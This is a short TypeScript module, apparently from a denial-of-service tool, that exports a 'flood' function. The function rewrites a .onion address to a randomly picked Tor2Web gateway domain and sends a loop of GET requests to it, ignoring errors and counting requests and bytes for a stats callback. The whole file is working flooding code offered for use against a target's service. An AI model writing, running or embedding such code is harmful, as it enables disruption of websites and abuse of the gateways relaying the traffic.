const TOR2WEB = [
  "onion.city", "onion.cab", "onion.direct", "onion.sh", "onion.link",
  "onion.ws", "onion.pet", "onion.rip", "onion.to", "onion.ly",
]

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  const provider = "." + randomChoice(TOR2WEB)
  const target = u.host.replace(".onion", provider)
  const fetchUrl = `http://${target}${u.pathname}${u.search}`

  for (let i = 0; i < rpc; i++) {
    try {
      const res = await fetch(fetchUrl, {
        method: "GET",
        headers: {
          "Host": target,
          "Connection": "keep-alive",
        },
        redirect: "manual",
      })
      onStats(1, 400)
    } catch {}
  }
}
